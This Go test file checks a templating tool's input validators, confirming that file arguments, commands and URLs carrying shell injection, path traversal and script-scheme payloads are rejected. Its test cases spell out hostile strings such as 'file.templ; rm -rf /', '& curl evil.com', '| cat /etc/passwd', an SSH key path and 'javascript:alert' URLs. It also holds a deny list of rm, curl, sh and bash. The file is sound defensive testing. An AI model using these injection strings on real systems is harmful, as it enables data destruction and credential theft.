package cmd

import (
	"testing"

	"github.com/conneroisu/templar/internal/validation"
)

func TestValidateArgument(t *testing.T) {
	tests := []struct {
		name        string
		arg         string
		expectError bool
		errorMsg    string
	}{
		// Valid arguments
		{
			name:        "valid simple argument",
			arg:         "component.templ",
			expectError: false,
		},
		{
			name:        "valid path with extension",
			arg:         "components/button.templ",
			expectError: false,
		},
		{
			name:        "valid allowed temp path",
			arg:         "/tmp/templar-build",
			expectError: false,
		},
		{
			name:        "valid allowed usr path",
			arg:         "/usr/local/bin/templ",
			expectError: false,
		},

		// Command injection attempts
		{
			name:        "semicolon injection",
			arg:         "file.templ; rm -rf /",
			expectError: true,
			errorMsg:    "contains dangerous character: ;",
		},
		{
			name:        "ampersand background execution",
			arg:         "file.templ & curl evil.com",
			expectError: true,
			errorMsg:    "contains dangerous character: &",
		},
		{
			name:        "pipe injection",
			arg:         "file.templ | cat /etc/passwd",
			expectError: true,
			errorMsg:    "contains dangerous character: |",
		},
		{
			name:        "dollar variable expansion",
			arg:         "file.templ$HOME",
			expectError: true,
			errorMsg:    "contains dangerous character: $",
		},
		{
			name:        "backtick command substitution",
			arg:         "file.templ`whoami`",
			expectError: true,
			errorMsg:    "contains dangerous character: `",
		},
		{
			name:        "parentheses subshell",
			arg:         "file.templ(echo pwned)",
			expectError: true,
			errorMsg:    "contains dangerous character: (",
		},
		{
			name:        "closing parentheses",
			arg:         "file.templ)",
			expectError: true,
			errorMsg:    "contains dangerous character: )",
		},
		{
			name:        "curly braces expansion",
			arg:         "file.templ{a,b}",
			expectError: true,
			errorMsg:    "contains dangerous character: {",
		},
		{
			name:        "square brackets globbing",
			arg:         "file.templ[abc]",
			expectError: true,
			errorMsg:    "contains dangerous character: [",
		},
		{
			name:        "redirect output",
			arg:         "file.templ > /etc/passwd",
			expectError: true,
			errorMsg:    "contains dangerous character: >",
		},
		{
			name:        "redirect input",
			arg:         "file.templ < /etc/passwd",
			expectError: true,
			errorMsg:    "contains dangerous character: <",
		},
		{
			name:        "double quotes injection",
			arg:         "file.templ\"echo pwned\"",
			expectError: true,
			errorMsg:    "contains dangerous character: \"",
		},
		{
			name:        "single quotes injection",
			arg:         "file.templ'echo pwned'",
			expectError: true,
			errorMsg:    "contains dangerous character: '",
		},
		{
			name:        "backslash escape",
			arg:         "file.templ\\echo",
			expectError: true,
			errorMsg:    "contains dangerous character: \\",
		},

		// Path traversal attempts
		{
			name:        "simple path traversal",
			arg:         "../../../etc/passwd",
			expectError: true,
			errorMsg:    "path traversal attempt detected",
		},
		{
			name:        "embedded path traversal",
			arg:         "components/../../../etc/passwd",
			expectError: true,
			errorMsg:    "path traversal attempt detected",
		},
		{
			name:        "encoded path traversal",
			arg:         "file..templ",
			expectError: true,
			errorMsg:    "path traversal attempt detected",
		},

		// Suspicious absolute paths
		{
			name:        "etc directory access",
			arg:         "/etc/passwd",
			expectError: true,
			errorMsg:    "absolute path not allowed: /etc/passwd",
		},
		{
			name:        "home directory access",
			arg:         "/home/user/.ssh/id_rsa",
			expectError: true,
			errorMsg:    "absolute path not allowed: /home/user/.ssh/id_rsa",
		},
		{
			name:        "root filesystem access",
			arg:         "/bin/sh",
			expectError: true,
			errorMsg:    "absolute path not allowed: /bin/sh",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateArgument(tt.arg)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for argument '%s', but got none", tt.arg)
				} else if tt.errorMsg != "" && err.Error() != tt.errorMsg {
					t.Errorf("Expected error message '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for argument '%s', but got: %v", tt.arg, err)
				}
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	allowedCommands := map[string]bool{
		"templ": true,
		"go":    true,
	}

	tests := []struct {
		name        string
		command     string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "allowed templ command",
			command:     "templ",
			expectError: false,
		},
		{
			name:        "allowed go command",
			command:     "go",
			expectError: false,
		},
		{
			name:        "disallowed rm command",
			command:     "rm",
			expectError: true,
			errorMsg:    "command 'rm' is not allowed",
		},
		{
			name:        "disallowed curl command",
			command:     "curl",
			expectError: true,
			errorMsg:    "command 'curl' is not allowed",
		},
		{
			name:        "disallowed sh command",
			command:     "sh",
			expectError: true,
			errorMsg:    "command 'sh' is not allowed",
		},
		{
			name:        "disallowed bash command",
			command:     "bash",
			expectError: true,
			errorMsg:    "command 'bash' is not allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCommand(tt.command, allowedCommands)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command '%s', but got none", tt.command)
				} else if tt.errorMsg != "" && err.Error() != tt.errorMsg {
					t.Errorf("Expected error message '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for command '%s', but got: %v", tt.command, err)
				}
			}
		})
	}
}

func TestValidateURL(t *testing.T) {
	tests := []struct {
		name        string
		url         string
		expectError bool
		errorMsg    string
	}{
		// Valid URLs
		{
			name:        "valid http URL",
			url:         "http://localhost:8080",
			expectError: false,
		},
		{
			name:        "valid https URL",
			url:         "https://localhost:8080",
			expectError: false,
		},
		{
			name:        "valid URL with path",
			url:         "http://localhost:8080/preview/Button",
			expectError: false,
		},
		{
			name:        "valid URL with query params",
			url:         "http://localhost:8080/preview?component=Button",
			expectError: false,
		},
		{
			name:        "valid URL with port",
			url:         "http://127.0.0.1:3000",
			expectError: false,
		},

		// Invalid URL structure
		{
			name:        "malformed URL",
			url:         "not-a-url",
			expectError: true,
		},
		{
			name:        "empty hostname",
			url:         "http://",
			expectError: true,
			errorMsg:    "URL must have a valid hostname",
		},

		// Dangerous schemes
		{
			name:        "javascript scheme",
			url:         "javascript:alert('xss')",
			expectError: true,
			errorMsg:    "invalid URL scheme: javascript (only http/https allowed)",
		},
		{
			name:        "file scheme",
			url:         "file:///etc/passwd",
			expectError: true,
			errorMsg:    "invalid URL scheme: file (only http/https allowed)",
		},
		{
			name:        "data scheme",
			url:         "data:text/html,<script>alert('xss')</script>",
			expectError: true,
			errorMsg:    "invalid URL scheme: data (only http/https allowed)",
		},
		{
			name:        "ftp scheme",
			url:         "ftp://example.com",
			expectError: true,
			errorMsg:    "invalid URL scheme: ftp (only http/https allowed)",
		},

		// Command injection attempts (caught by URL parser)
		{
			name:        "semicolon injection",
			url:         "http://localhost:8080; rm -rf /",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "ampersand injection",
			url:         "http://localhost:8080 & curl evil.com",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "pipe injection",
			url:         "http://localhost:8080 | cat /etc/passwd",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "backtick injection",
			url:         "http://localhost:8080`whoami`",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "dollar injection",
			url:         "http://localhost:8080$HOME",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "parentheses injection",
			url:         "http://localhost:8080(echo pwned)",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "redirect injection",
			url:         "http://localhost:8080 > /tmp/pwned",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "quotes injection",
			url:         "http://localhost:8080\"echo pwned\"",
			expectError: true,
			// URL parser catches this as malformed URL
		},
		{
			name:        "newline injection",
			url:         "http://localhost:8080\necho pwned",
			expectError: true,
			// URL parser catches this as control character
		},
		{
			name:        "carriage return injection",
			url:         "http://localhost:8080\recho pwned",
			expectError: true,
			// URL parser catches this as control character
		},

		// More sophisticated injection attempts that might pass URL parsing
		{
			name:        "query parameter injection",
			url:         "http://localhost:8080/?cmd=;rm+-rf+/",
			expectError: true,
			errorMsg:    "URL contains shell metacharacter ';' (potential command injection)",
		},
		{
			name:        "fragment injection",
			url:         "http://localhost:8080/#;rm+-rf+/",
			expectError: true,
			errorMsg:    "URL contains shell metacharacter ';' (potential command injection)",
		},
		{
			name:        "path injection with dangerous chars",
			url:         "http://localhost:8080/path;rm+-rf+/",
			expectError: true,
			errorMsg:    "URL contains shell metacharacter ';' (potential command injection)",
		},
		{
			name:        "URL with legitimate spaces encoded",
			url:         "http://localhost:8080/path%20with%20spaces",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validation.ValidateURL(tt.url)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for URL '%s', but got none", tt.url)
				} else if tt.errorMsg != "" && err.Error() != tt.errorMsg {
					t.Errorf("Expected error message '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for URL '%s', but got: %v", tt.url, err)
				}
			}
		})
	}
}

func TestValidateArguments(t *testing.T) {
	tests := []struct {
		name        string
		args        []string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid arguments",
			args:        []string{"component.templ", "output.go"},
			expectError: false,
		},
		{
			name:        "empty arguments list",
			args:        []string{},
			expectError: false,
		},
		{
			name:        "one invalid argument",
			args:        []string{"valid.templ", "invalid; rm -rf /"},
			expectError: true,
			errorMsg:    "invalid argument 'invalid; rm -rf /': contains dangerous character: ;",
		},
		{
			name:        "multiple invalid arguments",
			args:        []string{"invalid1; rm", "invalid2| cat"},
			expectError: true,
			errorMsg:    "invalid argument 'invalid1; rm': contains dangerous character: ;",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateArguments(tt.args)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for arguments %v, but got none", tt.args)
				} else if tt.errorMsg != "" && err.Error() != tt.errorMsg {
					t.Errorf("Expected error message '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for arguments %v, but got: %v", tt.args, err)
				}
			}
		})
	}
}

// Benchmark tests to ensure validation doesn't impact performance.
func BenchmarkValidateArgument(b *testing.B) {
	arg := "components/button.templ"
	for range b.N {
		validateArgument(arg)
	}
}

func BenchmarkValidateURL(b *testing.B) {
	url := "http://localhost:8080/preview/Button"
	for range b.N {
		validation.ValidateURL(url)
	}
}

func BenchmarkValidateArgumentsLarge(b *testing.B) {
	args := make([]string, 100)
	for i := range args {
		args[i] = "component.templ"
	}

	b.ResetTimer()
	for range b.N {
		validateArguments(args)
	}
}
